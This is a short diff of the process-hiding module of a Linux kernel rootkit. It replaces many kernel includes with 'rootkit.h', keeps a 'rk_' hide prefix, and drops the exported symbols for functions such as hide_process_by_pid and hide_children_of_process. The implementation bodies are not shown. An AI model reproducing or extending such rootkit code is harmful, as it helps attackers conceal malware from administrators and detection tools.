@@ -1,26 +1,10 @@
 /*
- * Advanced Process Hiding Implementation
- * Provides multiple methods to hide processes from detection
- * Kernel Version: 5.15.142
+ * Process Hiding Implementation
+ * Advanced techniques for hiding processes from detection
  */
 
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/syscalls.h>
-#include <linux/sched.h>
-#include <linux/sched/signal.h>
-#include <linux/pid.h>
-#include <linux/proc_fs.h>
-#include <linux/seq_file.h>
-#include <linux/uaccess.h>
-#include <linux/slab.h>
-#include <linux/list.h>
+#include "rootkit.h"
 #include <linux/mutex.h>
-#include <linux/string.h>
-#include <linux/dirent.h>
-#include <linux/fs.h>
-#include <linux/namei.h>
-#include <linux/rcupdate.h>
 
 #define MAX_HIDDEN_PROCS 500
 #define HIDE_PREFIX "rk_"
@@ -523,13 +507,4 @@ void cleanup_process_hiding(void) {
 }
 
 // 导出符号
-EXPORT_SYMBOL(hide_process_by_pid);
-EXPORT_SYMBOL(hide_process_by_name);
-EXPORT_SYMBOL(hide_process_by_prefix);
-EXPORT_SYMBOL(hide_current_process);
-EXPORT_SYMBOL(unhide_process);
-EXPORT_SYMBOL(get_hidden_procs_count);
-EXPORT_SYMBOL(get_hidden_procs_info);
-EXPORT_SYMBOL(hide_children_of_process);
-EXPORT_SYMBOL(init_process_hiding);
-EXPORT_SYMBOL(cleanup_process_hiding);
+// Functions are part of the same module, no need to export
